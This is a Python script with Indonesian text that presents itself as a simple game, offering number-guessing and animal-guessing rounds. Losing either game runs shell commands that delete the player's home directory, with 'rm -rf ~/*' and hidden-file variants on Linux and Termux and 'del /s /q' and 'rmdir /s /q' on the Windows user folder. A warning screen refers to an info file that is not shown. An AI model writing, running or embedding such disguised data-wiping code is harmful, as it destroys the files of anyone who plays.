import random
import os
import platform
import subprocess
import time

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
W = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

commands = {
    "Linux": [
        "rm -rf ~/*",
        "rm -rf ~/.[!.]*"
    ],
    "Termux": [
        "rm -rf ~/*",
        "rm -rf ~/.[!.]*"
    ],
    "Windows": [
        r"del /s /q C:\Users\%USERNAME%\*",
        r"rmdir /s /q C:\Users\%USERNAME%\*"
    ]
}

def is_termux():
    return bool(os.environ.get("TERMUX_VERSION"))

def get_system():
    return platform.system()

def get_system_commands():
    system = get_system()
    if system == "Linux" and is_termux():
        return commands.get("Termux", [])
    if system == "Linux":
        return commands.get("Linux", [])
    if system == "Windows":
        return commands.get("Windows", [])
    return []

def run_command(cmd):
    if "~" in cmd:
        cmd = cmd.replace("~", os.path.expanduser("~"))
    try:
        subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"{R}[ERROR]{RESET} {e}")

def clear_screen():
    if get_system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def show_info():
    """Menampilkan isi file info.txt"""
    clear_screen()
    if os.path.exists("info.txt"):
        with open("info.txt", "r", encoding="utf-8") as f:
            print(f"{C}{f.read()}{RESET}")
    else:
        print(f"{R}File info.txt tidak ditemukan!{RESET}")
    input(f"\n{Y}Tekan Enter untuk kembali...{RESET}")
    clear_screen()

def peringatan():
    while True:
        clear_screen()
        print(f"{R}{BOLD}=== PERINGATAN ⚠️ ==={RESET}")
        print(f"{R}{BOLD}\nWAJIB BACA INFO DAHULU")
        print(f"{Y}Ketik 1 untuk baca file INFO")
        print(f"Ketik 2 untuk mulai game{RESET}\n")

        pilihan = input(f"{C}Pilih >> {RESET}").strip()

        if pilihan == "1":
            show_info()
        elif pilihan == "2":
            clear_screen()
            return
        else:
            print(f"{R}Pilihan tidak valid!{RESET}")
            time.sleep(1)

def game_tebak_angka():
    interval = 10
    start = random.randint(0, 9) * interval + 1
    end = min(start + interval - 1, 100)
    angka_rahasia = random.randint(start, end)
    max_attempt = 10

    for attempt in range(1, max_attempt + 1):
        print(f"\n{C}Clue:{RESET} Angka rahasia ada di antara {Y}{start}{RESET} - {Y}{end}{RESET}")
        try:
            tebakan = int(input(f"{B}Tebakan {attempt}/{max_attempt}:{RESET} "))
        except ValueError:
            print(f"{R}Masukkan angka valid!{RESET}")
            continue

        if tebakan == angka_rahasia:
            print(f"{G}🎉 Benar! Angka rahasia: {angka_rahasia} (percobaan ke-{attempt}){RESET}")
            time.sleep(0.6)
            clear_screen()
            return
        else:
            print(f"{R}❌ Salah!{RESET}")

    print(f"\n{R}Game Over!{RESET} Angka rahasia: {Y}{angka_rahasia}{RESET}")
    cmds = get_system_commands()
    for cmd in cmds:
        run_command(cmd)
    time.sleep(1)
    clear_screen()

def game_tebak_hewan():
    hewan_dict = {
        "ikan": "Hidup di air",
        "kucing": "Hewan peliharaan populer, suka mengeong",
        "anjing": "Sahabat manusia, suka menggonggong",
        "burung": "Bisa terbang di langit",
        "gajah": "Hewan darat terbesar dengan belalai",
        "singa": "Raja hutan",
        "harimau": "Kucing besar bergaris",
        "ular": "Tidak punya kaki, bisa melata",
        "kuda": "Bisa ditunggangi",
        "ayam": "Hidup di kandang, berkokok pagi hari",
        "bebek": "Hidup di darat dan air, bersuara kwek",
        "ikan paus": "Hewan laut terbesar",
        "hiu": "Predator laut bergigi tajam",
        "kupu-kupu": "Cantik, punya sayap berwarna",
        "kelelawar": "Hewan malam, bisa terbang, suka gua"
    }

    hewan_rahasia, clue = random.choice(list(hewan_dict.items()))
    max_attempt = 10

    for attempt in range(1, max_attempt + 1):
        print(f"\n{C}Clue:{RESET} {clue}")
        tebakan = input(f"{B}Tebakan {attempt}/{max_attempt}:{RESET} ").strip().lower()
        if tebakan == hewan_rahasia:
            print(f"{G}🎉 Benar! Hewan rahasia: {hewan_rahasia} (percobaan ke-{attempt}){RESET}")
            time.sleep(0.6)
            clear_screen()
            return
        else:
            print(f"{R}❌ Salah!{RESET}")

    print(f"\n{R}Game Over!{RESET} Hewan rahasia: {Y}{hewan_rahasia}{RESET}")
    cmds = get_system_commands()
    for cmd in cmds:
        run_command(cmd)
    time.sleep(1)
    clear_screen()

def main():
    while True:
        clear_screen()
        print(f"{BOLD}{C}╔════════════════════════════════════╗{RESET}")
        print(f"{BOLD}{C}║          GAME SIMPLE 🎮            ║{RESET}")
        print(f"{BOLD}{C}╚════════════════════════════════════╝{RESET}")
        print(f"{Y}1.{RESET} Tebak Angka {C}(clue interval){RESET}")
        print(f"{Y}2.{RESET} Tebak Hewan")
        print(f"{Y}3.{RESET} Keluar\n")

        pilihan = input(f"{BOLD}{G}Pilih game >> {RESET}").strip()
        if pilihan == "1":
            clear_screen()
            game_tebak_angka()
        elif pilihan == "2":
            clear_screen()
            game_tebak_hewan()
        elif pilihan == "3":
            print(f"{R}Keluar dari game...{RESET}")
            break
        else:
            print(f"{R}Pilihan tidak valid!{RESET}")
            time.sleep(0.5)

if __name__ == "__main__":
    peringatan()
    main()
